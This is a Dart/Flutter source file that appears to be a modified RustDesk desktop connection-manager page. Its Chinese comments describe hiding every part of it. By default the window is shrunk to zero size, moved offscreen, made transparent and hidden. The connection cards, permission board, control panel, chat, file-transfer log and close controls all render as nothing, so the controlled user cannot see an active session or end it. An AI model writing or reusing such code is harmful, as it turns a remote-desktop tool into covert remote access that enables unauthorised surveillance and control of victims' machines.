import 'dart:async';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter_hbb/common/widgets/audio_input.dart';
import 'package:flutter_hbb/consts.dart';
import 'package:flutter_hbb/desktop/widgets/tabbar_widget.dart';
import 'package:flutter_hbb/models/chat_model.dart';
import 'package:flutter_hbb/models/cm_file_model.dart';
import 'package:flutter_hbb/utils/platform_channel.dart';
import 'package:get/get.dart';
import 'package:percent_indicator/linear_percent_indicator.dart';
import 'package:provider/provider.dart';
import 'package:window_manager/window_manager.dart';
import 'package:flutter_svg/flutter_svg.dart';

import '../../common.dart';
import '../../common/widgets/chat_page.dart';
import '../../models/file_model.dart';
import '../../models/platform_model.dart';
import '../../models/server_model.dart';

class DesktopServerPage extends StatefulWidget {
  final bool hideWindow; // 控制整个窗口是否隐藏

  const DesktopServerPage({Key? key, this.hideWindow = true}) : super(key: key);

  @override
  State<DesktopServerPage> createState() => _DesktopServerPageState();
}

class _DesktopServerPageState extends State<DesktopServerPage>
    with WindowListener, AutomaticKeepAliveClientMixin {
  final tabController = gFFI.serverModel.tabController;

  _DesktopServerPageState() {
    gFFI.ffiModel.updateEventListener(gFFI.sessionId, "");
    Get.put<DesktopTabController>(tabController);
    tabController.onRemoved = (_, id) {
      onRemoveId(id);
    };
  }

  @override
  void initState() {
    windowManager.addListener(this);
    
    // 隐藏窗口时设置为极小尺寸并移到屏幕外
    if (widget.hideWindow) {
      windowManager.setSize(Size(0, 0));
      windowManager.setPosition(Offset(-10000, -10000)); // 坐标设为-10000
      windowManager.setOpacity(0.0); // 完全透明
      windowManager.hide(); // 隐藏窗口
    }
    
    super.initState();
  }

  @override
  void dispose() {
    windowManager.removeListener(this);
    super.dispose();
  }

  @override
  void onWindowClose() {
    Future.wait([gFFI.serverModel.closeAll(), gFFI.close()]).then((_) {
      if (isMacOS) {
        RdPlatformChannel.instance.terminate();
      } else {
        windowManager.setPreventClose(false);
        windowManager.close();
      }
    });
    super.onWindowClose();
  }

  void onRemoveId(String id) {
    if (tabController.state.value.tabs.isEmpty) {
      windowManager.close();
    }
  }

  @override
  Widget build(BuildContext context) {
    // 彻底隐藏时不渲染任何内容
    if (widget.hideWindow) return const SizedBox.shrink();
    
    super.build(context);
    return MultiProvider(
      providers: [
        ChangeNotifierProvider.value(value: gFFI.serverModel),
        ChangeNotifierProvider.value(value: gFFI.chatModel),
      ],
      child: Consumer<ServerModel>(
        builder: (context, serverModel, child) {
          final body = Scaffold(
            backgroundColor: Theme.of(context).colorScheme.background,
            body: ConnectionManager(hideCM: widget.hideWindow),
          );
          
          // 仅在非隐藏时绘制边框
          return isLinux
              ? buildVirtualWindowFrame(context, body)
              : workaroundWindowBorder(context, body);
        },
      ),
    );
  }

  @override
  bool get wantKeepAlive => true;
}

class ConnectionManager extends StatefulWidget {
  final bool hideCM; // 控制连接管理器是否隐藏

  ConnectionManager({Key? key, this.hideCM = true}) : super(key: key);

  @override
  State<StatefulWidget> createState() => ConnectionManagerState();
}

class ConnectionManagerState extends State<ConnectionManager>
    with WidgetsBindingObserver {
  final RxBool _controlPageBlock = false.obs;
  final RxBool _sidePageBlock = false.obs;

  ConnectionManagerState() {
    gFFI.serverModel.tabController.onSelected = (client_id_str) {
      final client_id = int.tryParse(client_id_str);
      if (client_id != null) {
        final client =
            gFFI.serverModel.clients.firstWhereOrNull((e) => e.id == client_id);
        if (client != null) {
          gFFI.chatModel.changeCurrentKey(MessageKey(client.peerId, client.id));
          if (client.unreadChatMessageCount.value > 0) {
            WidgetsBinding.instance.addPostFrameCallback((_) {
              client.unreadChatMessageCount.value = 0;
              gFFI.chatModel.showChatPage(MessageKey(client.peerId, client.id));
            });
          }
          windowManager.setTitle(getWindowNameWithId(client.peerId));
          gFFI.cmFileModel.updateCurrentClientId(client.id);
        }
      }
    };
    gFFI.chatModel.isConnManager = true;
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    if (state == AppLifecycleState.resumed) {
      if (!allowRemoteCMModification()) {
        shouldBeBlocked(_controlPageBlock, null);
        shouldBeBlocked(_sidePageBlock, null);
      }
    }
  }

  @override
  void initState() {
    gFFI.serverModel.updateClientState();
    WidgetsBinding.instance.addObserver(this);
    super.initState();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    // 隐藏时返回完全收缩组件
    if (widget.hideCM) return const SizedBox.shrink();
    
    final serverModel = Provider.of<ServerModel>(context);
    pointerHandler(PointerEvent e) {
      if (serverModel.cmHiddenTimer != null) {
        serverModel.cmHiddenTimer!.cancel();
        serverModel.cmHiddenTimer = null;
        debugPrint("CM hidden timer has been canceled");
      }
    };

    return serverModel.clients.isEmpty
        ? const SizedBox.shrink()
        : Listener(
            onPointerDown: pointerHandler,
            onPointerMove: pointerHandler,
            child: DesktopTab(
              showTitle: false,
              showMaximize: false,
              showMinimize: true,
              showClose: true,
              onWindowCloseButton: handleWindowCloseButton,
              controller: serverModel.tabController,
              selectedBorderColor: MyTheme.accent,
              maxLabelWidth: 0, // 标签最大宽度设为0
              tail: null,
              tabBuilder: (key, icon, label, themeConf) {
                final client = serverModel.clients
                    .firstWhereOrNull((client) => client.id.toString() == key);
                return client == null ? const SizedBox.shrink() : Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Tooltip(
                        message: key,
                        waitDuration: Duration(seconds: 1),
                        child: label),
                    unreadMessageCountBuilder(client?.unreadChatMessageCount)
                        .marginOnly(left: 0), // 边距设为0
                  ],
                );
              },
              pageViewBuilder: (pageView) => LayoutBuilder(
                builder: (context, constraints) {
                  if (widget.hideCM) return const SizedBox.shrink();
                  
                  // 强制将所有面板宽度设为0
                  final realChatPageWidth = 0.0;
                  final realClosedWidth = 0.0;
                  
                  return Row(children: [
                    // 聊天面板（宽度为0）
                    if (constraints.maxWidth > kConnectionManagerWindowSizeClosedChat.width)
                      Consumer<ChatModel>(
                        builder: (_, model, child) => SizedBox(
                          width: realChatPageWidth,
                          height: 0, // 高度设为0
                          child: buildSidePage(),
                        ),
                      ),
                    
                    // 控制面板（宽度为0）
                    SizedBox(
                      width: realClosedWidth,
                      height: 0, // 高度设为0
                      child: pageView,
                    ),
                  ]);
                },
              ),
            ),
          );
  }

  Widget buildSidePage() {
    final selected = gFFI.serverModel.tabController.state.value.selected;
    if (selected < 0 || selected >= gFFI.serverModel.clients.length) {
      return const SizedBox.shrink();
    }
    final clientType = gFFI.serverModel.clients[selected].type_();
    return clientType == ClientType.file
        ? _FileTransferLogPage(hideFileLog: true) // 隐藏文件日志
        : ChatPage(type: ChatPageType.desktopCM);
  }

  Widget _buildKeyEventBlock(Widget child) {
    return ExcludeFocus(child: child, excluding: true);
  }

  Widget buildTitleBar() {
    return const SizedBox.shrink(); // 隐藏标题栏
  }

  Widget buildScrollJumper() {
    return const SizedBox.shrink(); // 隐藏滚动控制
  }

  Future<bool> handleWindowCloseButton() async {
    return true; // 隐藏时禁止关闭操作
  }
}

// 隐藏连接卡片
Widget buildConnectionCard(Client client, {bool hideCard = true}) {
  return hideCard ? const SizedBox.shrink() : Consumer<ServerModel>(
    builder: (context, value, child) => Column(
      mainAxisAlignment: MainAxisAlignment.start,
      crossAxisAlignment: CrossAxisAlignment.start,
      key: ValueKey(client.id),
      children: [
        _CmHeader(client: client, hideHeader: hideCard),
        client.type_() == ClientType.file ||
                client.type_() == ClientType.portForward ||
                client.disconnected
            ? const SizedBox.shrink()
            : _PrivilegeBoard(client: client, hideBoard: hideCard),
        Expanded(
          child: Align(
            alignment: Alignment.bottomCenter,
            child: _CmControlPanel(client: client, hidePanel: hideCard),
          ),
        )
      ],
    ).paddingSymmetric(vertical: 0, horizontal: 0), // 边距设为0
  );
}

class _AppIcon extends StatelessWidget {
  const _AppIcon({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const SizedBox.shrink(); // 隐藏图标
  }
}

class _CloseButton extends StatelessWidget {
  const _CloseButton({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const SizedBox.shrink(); // 隐藏关闭按钮
  }
}

class _CmHeader extends StatefulWidget {
  final Client client;
  final bool hideHeader; // 控制头部是否隐藏

  const _CmHeader({Key? key, required this.client, this.hideHeader = true}) : super(key: key);

  @override
  State<_CmHeader> createState() => _CmHeaderState();
}

class _CmHeaderState extends State<_CmHeader> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideHeader) return const SizedBox.shrink(); // 隐藏头部

    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(0), // 圆角设为0
        gradient: LinearGradient(
          begin: Alignment.topRight,
          end: Alignment.bottomLeft,
          colors: [
            Color(0xff00bfe1),
            Color(0xff0071ff),
          ],
        ),
      ),
      margin: EdgeInsets.symmetric(horizontal: 0, vertical: 0), // 边距设为0
      padding: EdgeInsets.only(
        top: 0, // 内边距设为0
        bottom: 0,
        left: 0,
        right: 0,
      ),
      width: 0, // 宽度设为0
      height: 0, // 高度设为0
      child: const SizedBox.shrink(), // 防止内容渲染
    );
  }
}

class _PrivilegeBoard extends StatefulWidget {
  final Client client;
  final bool hideBoard; // 控制权限面板是否隐藏

  const _PrivilegeBoard({Key? key, required this.client, this.hideBoard = true}) : super(key: key);

  @override
  State<StatefulWidget> createState() => _PrivilegeBoardState();
}

class _PrivilegeBoardState extends State<_PrivilegeBoard> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideBoard) return const SizedBox.shrink(); // 隐藏权限面板

    return const SizedBox.shrink(); // 空实现
  }
}

const double buttonBottomMargin = 0; // 按钮边距设为0

class _CmControlPanel extends StatelessWidget {
  final Client client;
  final bool hidePanel; // 控制控制面板是否隐藏

  const _CmControlPanel({Key? key, required this.client, this.hidePanel = true}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if (hidePanel) return const SizedBox.shrink(); // 隐藏控制面板

    return const SizedBox.shrink(); // 空实现
  }
}

void checkClickTime(int id, Function() callback) async {}

bool allowRemoteCMModification() {
  return false; // 隐藏时禁止所有操作
}

class _FileTransferLogPage extends StatefulWidget {
  final bool hideFileLog; // 控制文件传输日志是否隐藏

  _FileTransferLogPage({Key? key, this.hideFileLog = true}) : super(key: key);

  @override
  State<_FileTransferLogPage> createState() => __FileTransferLogPageState();
}

class __FileTransferLogPageState extends State<_FileTransferLogPage> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideFileLog) return const SizedBox.shrink(); // 隐藏文件日志

    return const SizedBox.shrink();
  }
}
